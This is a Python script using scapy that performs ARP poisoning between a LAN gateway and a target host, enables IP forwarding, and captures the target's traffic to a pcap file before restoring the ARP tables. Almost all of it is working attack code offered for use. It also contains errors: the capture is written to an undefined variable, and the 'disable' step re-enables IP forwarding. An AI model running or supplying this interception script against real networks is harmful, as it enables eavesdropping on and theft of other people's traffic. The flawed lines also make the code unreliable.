import sys, multiprocessing, os
from scapy.all import *

gateIp = "192.168.1.1"
targetIp = "192.168.1.12"
interface = "eth0"
packets = 999999
logfile = "log.pcap"
bcast = "ff:ff:ff:ff:ff:ff"

def ip2mac(ip):
    rsp = srp1(Ether(dst=bcast) / ARP(pdst=ip), timeout=2, retry=3)
    return rsp[Ether].src

def arpPoison(gateIp,gateMac,targetIp,targetMac):
    while True:
        try:
            print("ARP poisoning starting")
            send(ARP(op=2,psrc=gateIp,pdst=targetIp,hwdst=targetMac))
            send(ARP(op=2,psrc=targetIp,pdst=gateIp,hwdst=gateMac))
            time.sleep(2)
        except KeyboardInterrupt:
            pass

def arpRestore(gateIp,gateMac,targetIp,targetMac):
    for x in range(5):
        print("[*] Restoring ARP table [" + str(x) + " of 4]")
        send(ARP(op=2, psrc=gateIp, pdst=targetIp, hwdst=bcast, hwsrc=gateMac), count=5)
        send(ARP(op=2, psrc=targetIp, pdst=gateIp, hwdst=bcast, hwsrc=targetMac), count=5)
        time.sleep(2)

if __name__ == "__main__":
    conf.iface = interface
    conf.verb = 0
    gateMac = ip2mac(gateIp)
    targetMac = ip2mac(targetIp)
    print("Interface :" + interface)
    print("Gateway: " + gateIp + " [" +gateMac + "]")
    print("Target: " + targetIp + " [" +targetMac+ "]")
    print("Enabling pocket forwarding")
    os.system("/sbin/sysctl -w net.ipv4.ip_forward=1 >/dev/null 2>&1")

    p = multiprocessing.Process(target=arpPoison, args=(gateIp,gateMac,targetIp,targetMac,))
    p.start()

    print("Sniffing Packets")

    packets = sniff(count = packets, filter = ("ip host " + targetIp), iface=interface)
    wrpcap(logfiles,packets)
    p.terminate()
    print("Sniffing completed")

    print("Disable packet forwarding")
    os.system("/sbin/sysctl -w net.ipv4.ip_forward=1 >/dev/null 2>&1")
    arpRestore(gateIp,gateMac,targetIp,targetMac)
    print("Exiting")






